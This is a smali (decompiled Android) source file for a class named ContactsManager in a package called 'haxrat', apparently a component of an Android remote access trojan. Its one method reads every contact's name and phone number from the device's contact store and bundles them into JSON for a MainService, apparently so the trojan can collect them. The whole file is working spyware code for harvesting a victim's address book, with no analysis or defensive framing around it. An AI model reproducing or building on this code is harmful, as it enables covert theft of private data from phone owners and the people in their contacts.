.class public Lcom/hax4us/haxrat/ContactsManager;
.super Ljava/lang/Object;
.source "ContactsManager.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 38
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getContacts()Lorg/json/JSONObject;
    .locals 16

    .prologue
    .line 15
    :try_start_0
    new-instance v8, Lorg/json/JSONObject;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

    move-object v1, v8

    .line 16
    new-instance v8, Lorg/json/JSONArray;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    invoke-direct {v9}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v8

    .line 17
    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v8}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v8

    sget-object v9, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v10, 0x2

    new-array v10, v10, [Ljava/lang/String;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    const/4 v12, 0x0

    const-string v13, "display_name"

    aput-object v13, v11, v12

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    const/4 v12, 0x1

    const-string v13, "data1"

    aput-object v13, v11, v12

    const/4 v11, 0x0

    check-cast v11, Ljava/lang/String;

    const/4 v12, 0x0

    check-cast v12, [Ljava/lang/String;

    new-instance v13, Ljava/lang/StringBuffer;

    move-object v15, v13

    move-object v13, v15

    move-object v14, v15

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    const-string v14, "display_name"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, " ASC"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual/range {v8 .. v13}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    move-object v3, v8

    .line 21
    :goto_0
    move-object v8, v3

    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v8

    if-nez v8, :cond_0

    .line 31
    move-object v8, v1

    const-string v9, "contactsList"

    move-object v10, v2

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 32
    move-object v8, v1

    move-object v0, v8

    .line 36
    :goto_1
    return-object v0

    .line 22
    :cond_0
    new-instance v8, Lorg/json/JSONObject;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

    move-object v4, v8

    .line 23
    move-object v8, v3

    move-object v9, v3

    const-string v10, "display_name"

    invoke-interface {v9, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 24
    move-object v8, v3

    move-object v9, v3

    const-string v10, "data1"

    invoke-interface {v9, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    move-object v6, v8

    .line 26
    move-object v8, v4

    const-string v9, "phoneNo"

    move-object v10, v6

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 27
    move-object v8, v4

    const-string v9, "name"

    move-object v10, v5

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 28
    move-object v8, v2

    move-object v9, v4

    invoke-virtual {v8, v9}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v8

    goto :goto_0

    .line 32
    :catch_0
    move-exception v8

    move-object v1, v8

    .line 34
    move-object v8, v1

    invoke-virtual {v8}, Lorg/json/JSONException;->printStackTrace()V

    .line 36
    const/4 v8, 0x0

    check-cast v8, Lorg/json/JSONObject;

    move-object v0, v8

    goto :goto_1
.end method
